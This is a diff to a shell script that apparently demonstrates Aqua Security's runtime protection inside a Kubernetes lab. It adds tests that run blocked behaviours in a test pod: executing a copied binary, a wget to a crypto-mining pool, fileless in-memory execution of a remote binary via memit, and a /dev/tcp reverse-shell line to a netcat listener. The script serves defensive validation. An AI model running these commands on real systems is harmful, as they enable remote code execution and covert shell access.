@@ -192,10 +192,22 @@ test_drift_prevention() {
 
     case $prerequisites_met in
         [Yy]*)
-            # Execute commands in the deployed container
+            # Make a copy of /bin/ls and execute the copy
             if check_container_existence; then
-                # Add your drift prevention test logic here
-                echo "Drift prevention test logic goes here..."
+                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                echo
+                print_colored_message yellow "Copying '/bin/ls' to '/tmp/ls_copy' in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- cp /bin/ls /tmp/ls_copy
+                echo
+                print_colored_message yellow "Executing './ls_copy' command in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- /tmp/ls_copy
+                echo
+                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                echo
+                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
             else
                 print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
             fi
@@ -222,8 +234,16 @@ test_block_cryptocurrency_mining() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                # Add your block cryptocurrency mining test logic here
-                echo "Block cryptocurrency mining test logic goes here..."
+                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                echo
+                print_colored_message yellow "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
+                echo
+                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                echo
+                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
             else
                 print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
             fi
@@ -251,8 +271,24 @@ test_block_fileless_execution() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                # Add your block fileless execution test logic here
-                echo "Block fileless execution test logic goes here..."
+                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                echo
+                print_colored_message yellow "Executing 'wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64' command in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64
+                echo
+                print_colored_message yellow "Executing 'chmod +x memit-linux-amd64' command in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- chmod +x memit-linux-amd64
+                echo
+                print_colored_message yellow "Executing './memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist' command in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- ./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist
+                echo
+                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                echo
+                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
             else
                 print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
             fi
@@ -279,8 +315,32 @@ test_reverse_shell() {
         [Yy]*)
             # Execute commands in the deployed container
             if check_container_existence; then
-                # Add your reverse shell test logic here
-                echo "Reverse shell test logic goes here..."
+                # Create a Centos pod with nc listener
+                echo
+                print_colored_message yellow "Creating Centos pod"
+                echo
+                kubectl run centos --image=stanhoe/centos-nc:7 --command sleep infinity
+                echo
+                print_colored_message yellow "Waiting for the Centos container pod to start running..."
+                while ! kubectl get pods | grep centos | grep -q "Running"; do
+                    sleep 5
+                done
+                echo
+                print_colored_message yellow "Centos container pod is running. Configuring nc listener in Centos pod..."
+                echo
+                kubectl exec centos -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
+                echo
+                print_colored_message yellow "Retrieving IP address..."
+                centos_pod_ip=$(kubectl get pods -o wide | grep centos | awk '{print $6}')
+                echo "$centos_pod_ip"
+                echo
+                print_colored_message yellow "Executing reverse shell from Aqua test container to Centos container..."
+                echo
+                aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$centos_pod_ip/12345 <&1"
+                echo
+                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
+                echo
             else
                 print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
             fi
